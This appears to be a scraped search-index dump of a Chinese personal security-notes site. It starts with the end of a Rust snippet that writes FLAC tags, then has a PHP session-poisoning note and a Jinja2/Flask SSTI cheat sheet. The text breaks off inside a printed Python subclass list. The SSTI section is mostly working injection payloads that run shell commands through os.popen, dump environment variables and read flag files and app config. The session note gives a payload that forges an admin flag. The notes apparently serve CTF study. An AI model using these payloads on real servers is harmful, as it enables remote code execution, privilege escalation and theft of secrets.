lyc=\u0026#34;[00:09.74]群青色の空\\n[00:11.88]自由なんてものは\\n[00:14.02]手を伸ばすほどに遠く遠く飛んでく\\n[00:16.80]ほら、海猫の歌が僕を笑っているんだ\\n[00:21.28]夏の島に縛られた十六年間\\n[00:25.08]長い前髪も伸び過ぎて捨てられたあの日みたい\\n[00:29.32]どんな愛情も\\n[00:30.50]ねえ、たったひと切れのパンより軽い（ライト）\\n[00:32.80]生きているよ\\n[00:34.43]神様にもきっと見捨てられている僕でも\\n[00:40.10]追い風に白い帆を上げよう\\n[00:43.92]君が留まり僕がゆくなら\\n[00:47.76]いつか遠い海で会えるんだろう\\n[00:51.56]きっとこの星はまあるいから\\n[00:55.40]追い風に白い帆を上げよう\\n[00:59.14]君が留まり僕がゆくなら\\n[01:02.88]いつか遠い海で会えるんだろう\\n[01:06.78]きっとこの星はまあるいから\\n[01:25.62]潮の香りが染み込んでいる日だ\\n[01:29.76]薄汚れた白い背中を押す風が吹いた\\n[01:33.68]もし叶うなら愛されたいな\\n[01:37.52]あたたかな胸に頰を埋め眠りたいな\\n[01:41.38]雲を追うよ、風を切るマスト\\n[01:45.02]僕を乗せた船はどこまでも\\n[01:48.72]黄金島にもゆけるよ\\n[01:50.60]地図はないけど\\n[01:52.32]さあ、人魚たちの歌に手を叩こう\\n[01:56.54]ナナナ……\\n[02:11.53]追い風に白い帆を上げよう\\n[02:15.30]君が留まり僕がゆくなら\\n[02:19.16]いつか遠い海で会えるんだろう\\n[02:22.92]きっとこの星はまあるいから\\n[02:26.94]追い風に白い帆を上げよう\\n[02:30.48]君が留まり僕がゆくなら\\n[02:34.24]いつか遠い海で会えるんだろう\\n[02:38.16]きっとこの星はまあるいから\\n[02:47.54]まあるいから\\n[02:55.42]まあるいから\\n\u0026#34;; let mut tag = Tag::read_from_path(\u0026#34;C:/test/rust/demo1/file/wcat.flac\u0026#34;).unwrap(); let data=reqwest::get(\u0026#34;https://p2.music.126.net/mog628G4JLNEMi-GpWxccQ==/109951164647211717.jpg\u0026#34;).await?.bytes().await?.to_vec(); tag.add_picture(\u0026#34;image/jpeg\u0026#34;, Media, data); let comment=tag.vorbis_comments_mut(); comment.set_lyrics(vec![lyc]); tag.save().unwrap(); Ok(()) } "},{"id":41,"href":"/docs/network-security/php/session%E4%BC%AA%E9%80%A0/","title":"session伪造","section":"php","content":"\rsession的存储\r#\r\u0026lt;?php session_start(); $_SESSION[\u0026#39;session\u0026#39;] = \u0026#39;123\u0026#39;; ?\u0026gt; 在win下面好像时默认存储在C:\\window下面的，找不到可以用everthing搜一下\n命名是以sess_[a-z0-9]\n其存储的内容是根据session.serialize_handler定义的存储机制决定\n存储机制 存储格式 php 键名 + 竖线 + 经过serialize()函数序列化处理的值 php_binry 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值 php_serialize 经过serialize()函数序列化处理的数组 以session.serialize_handler=php为例\nsession|s:3:\u0026#34;123\u0026#34;; session污染\n在有可控项写入session时用字符串拼接\n|N;admin|b:1; 可以造成admin==1\n"},{"id":42,"href":"/docs/network-security/python/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","title":"SSTI模板注入","section":"python","content":"SSTI模板注入\nSSTI (Server Side Template Injection) - HackTricks\n__class__ 查看对象所在的类 __base__ 查看一个类的父类 __mro__ 返回包含回溯一个类所有由继承过父类的元组 __subclasses__() 返回一个类的所有子类的列表 __builtins__ 内置模块的一个引用 __init__,__enter__ 类实例化出一个对象时进行初始化方法 __globals__ 返回一个函数所在的空间的所有类,属性,子模块以及方法的字典 __dict__ 返回包含一个模块所拥有的类,属性,子模块以及方法的字典 __getattribute__ 这个魔术方法可以拦截对对象的所有访问企图，但也具有访问对象的功能 ssti一般流程\r#\r尝试读取\n{{config}} {{self}} __class__.__init__.__globals__[app].config python2/3\npython2 \u0026#39;\u0026#39;.__class__.__mro__[2] \u0026#39;\u0026#39;.__class__.__base__.__base__ python3 \u0026#39;\u0026#39;.__class__.__mro__[1] \u0026#39;\u0026#39;.__class__.__base__. 获取所有子类\n\u0026#39;\u0026#39;.__class__.base__[0].__subclasses__() 查找有用的子类 \u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()[100].__init__ 通过__globals__\n\u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__ 调用内置库的函数用builtins,调用模块用import载入 \u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.eval \u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#34;ls\u0026#34;).read() 或者用eval导入os模块 \u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.eval.__import__(\u0026#39;os\u0026#39;).popen(\u0026#34;ls\u0026#34;).read() ().__class__.__base__.__subclasses__()[213].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;env\u0026#39;).read() 别骂了，我太菜了\n{{lipsum.__globals__.os.popen(\u0026#39;cat flag.txt\u0026#39;).read()}} ().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()\u0026#34;) 过滤字符串，用字符拼接的方式\nconfig\n__class__.__init__.__globals__[app].config 没有内置os模块的\n{{[].__class__.__base__.__subclasses__()[59].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()\u0026#34;)}} 有内置os模块的\n{{[].__class__.__base__.__subclasses__()[71].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;os\u0026#39;].popen(\u0026#39;ls\u0026#39;).read()}} 懒得找模块就直接bp遍历一波\n{{get_flashed_messages.__globals__[\u0026#39;current_app\u0026#39;].config[\u0026#39;FLAG\u0026#39;]}} {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls /\u0026#39;).read()\u0026#34;)}}{% endif %}{% endfor %} {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag.txt\u0026#39;).read()\u0026#34;)}}{% endif %}{% endfor %} 过滤参考网上大把\na=\u0026#34;[\u0026lt;class \u0026#39;type\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;async_generator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;int\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;bytearray_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;bytearray\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;bytes_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;builtin_function_or_method\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;callable_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;PyCapsule\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;cell\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;classmethod_descriptor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;classmethod\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;code\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;complex\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;coroutine\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict_items\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict_itemiterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict_keyiterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict_valueiterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict_keys\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;mappingproxy\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict_reverseitemiterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict_reversekeyiterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict_reversevalueiterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict_values\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dict\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;ellipsis\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;enumerate\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;float\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;frame\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;frozenset\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;function\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;generator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;getset_descriptor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;instancemethod\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;list_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;list_reverseiterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;list\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;longrange_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;member_descriptor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;memoryview\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;method_descriptor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;method\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;moduledef\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;module\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;odict_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;pickle.PickleBuffer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;property\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;range_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;range\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;reversed\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;symtable entry\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;set_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;set\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;slice\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;staticmethod\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;stderrprinter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;super\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;traceback\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;tuple_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;str_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;str\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;wrapper_descriptor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;types.GenericAlias\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;anext_awaitable\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;async_generator_asend\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;async_generator_athrow\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;async_generator_wrapped_value\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;coroutine_wrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;InterpreterID\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;managedbuffer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;method-wrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;types.SimpleNamespace\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;NoneType\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;NotImplementedType\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;weakcallableproxy\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;weakproxy\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;weakref\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;types.UnionType\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;EncodingMap\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;fieldnameiterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;formatteriterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;BaseException\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;hamt\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;hamt_array_node\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;hamt_bitmap_node\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;hamt_collision_node\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;keys\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;values\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;items\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_contextvars.Context\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_contextvars.ContextVar\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_contextvars.Token\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;Token.MISSING\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;filter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;map\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;zip\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib._ModuleLock\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib._DummyModuleLock\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib._ModuleLockManager\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib.ModuleSpec\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib.BuiltinImporter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib.FrozenImporter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib._ImportLockContext\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_thread.lock\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_thread.RLock\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_thread._localdummy\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_thread._local\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_io._IOBase\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_io._BytesIOBuffer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_io.IncrementalNewlineDecoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;posix.ScandirIterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;posix.DirEntry\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib_external.WindowsRegistryFinder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib_external._LoaderBasics\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib_external.FileLoader\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib_external._NamespacePath\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib_external._NamespaceLoader\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib_external.PathFinder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_frozen_importlib_external.FileFinder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;codecs.Codec\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;codecs.IncrementalEncoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;codecs.IncrementalDecoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;codecs.StreamReaderWriter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;codecs.StreamRecoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_abc._abc_data\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;abc.ABC\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;collections.abc.Hashable\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;collections.abc.Awaitable\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;collections.abc.AsyncIterable\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;collections.abc.Iterable\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;collections.abc.Sized\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;collections.abc.Container\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;collections.abc.Callable\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;os._wrap_close\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_sitebuiltins.Quitter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_sitebuiltins._Printer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_sitebuiltins._Helper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.accumulate\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.combinations\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.combinations_with_replacement\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.cycle\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.dropwhile\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.takewhile\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.islice\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.starmap\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.chain\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.compress\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.filterfalse\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.count\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.zip_longest\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.pairwise\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.permutations\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.product\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.repeat\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools.groupby\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools._grouper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools._tee\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itertools._tee_dataobject\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;operator.attrgetter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;operator.itemgetter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;operator.methodcaller\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;reprlib.Repr\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;collections.deque\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_collections._deque_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_collections._deque_reverse_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_collections._tuplegetter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;collections._Link\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;types.DynamicClassAttribute\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;types._GeneratorWrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;functools.partial\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;functools._lru_cache_wrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;functools.KeyWrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;functools._lru_list_elem\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;functools.partialmethod\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;functools.singledispatchmethod\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;functools.cached_property\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;enum.auto\u0026#39;\u0026gt;, \u0026lt;enum \u0026#39;Enum\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;re.Pattern\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;re.Match\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_sre.SRE_Scanner\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;sre_parse.State\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;sre_parse.SubPattern\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;sre_parse.Tokenizer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;re.Scanner\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;string.Template\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;string.Formatter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;contextlib.ContextDecorator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;contextlib.AsyncContextDecorator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;contextlib._GeneratorContextManagerBase\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;contextlib._BaseExitStack\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing._Final\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing._Immutable\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing._TypeVarLike\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing.Generic\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing._TypingEmpty\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing._TypingEllipsis\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing.Annotated\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing.NamedTuple\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing.TypedDict\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing.NewType\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing.io\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;typing.re\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;ast.AST\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;markupsafe._MarkupEscapeHelper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_weakrefset._IterationGuard\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_weakrefset.WeakSet\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;threading._RLock\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;threading.Condition\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;threading.Semaphore\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;threading.Event\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;threading.Barrier\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;threading.Thread\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;warnings.WarningMessage\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;select.poll\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;select.epoll\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;selectors.BaseSelector\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;subprocess.CompletedProcess\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;subprocess.Popen\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;platform._Processor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_socket.socket\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;array.array\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;array.arrayiterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;socketserver.BaseServer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;socketserver.ForkingMixIn\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;socketserver._NoThreads\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;socketserver.ThreadingMixIn\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;socketserver.BaseRequestHandler\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;datetime.date\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;datetime.time\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;datetime.timedelta\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;datetime.tzinfo\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;weakref.finalize._Info\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;weakref.finalize\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_random.Random\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_sha512.sha384\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_sha512.sha512\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.parse._ResultMixinStr\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.parse._ResultMixinBytes\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.parse._NetlocResultMixinBase\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;calendar._localized_month\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;calendar._localized_day\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;calendar.Calendar\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;calendar.different_locale\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email._parseaddr.AddrlistClass\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_struct.Struct\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_struct.unpack_iterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email.charset.Charset\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email.header.Header\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email.header._ValueFormatter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email._policybase._PolicyBase\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email.feedparser.BufferedSubFile\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email.feedparser.FeedParser\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email.parser.Parser\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email.parser.BytesParser\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;email.message.Message\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;http.client.HTTPConnection\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_ssl._SSLContext\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_ssl._SSLSocket\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_ssl.MemoryBIO\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_ssl.SSLSession\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_ssl.Certificate\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;ssl.SSLObject\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;mimetypes.MimeTypes\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;zlib.Compress\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;zlib.Decompress\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_bz2.BZ2Compressor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_bz2.BZ2Decompressor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_lzma.LZMACompressor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_lzma.LZMADecompressor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;ast.NodeVisitor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dis.Bytecode\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;tokenize.Untokenizer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;inspect.BlockFinder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;inspect._void\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;inspect._empty\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;inspect.Parameter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;inspect.BoundArguments\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;inspect.Signature\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;traceback._Sentinel\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;traceback.FrameSummary\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;traceback.TracebackException\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;logging.LogRecord\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;logging.PercentStyle\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;logging.Formatter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;logging.BufferingFormatter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;logging.Filter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;logging.Filterer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;logging.PlaceHolder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;logging.Manager\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;logging.LoggerAdapter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug._internal._Missing\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.exceptions.Aborter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.urls.Href\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_hashlib.HASH\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_hashlib.HMAC\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_blake2.blake2b\u0026#39;\u0026gt;, \u0026lt;class 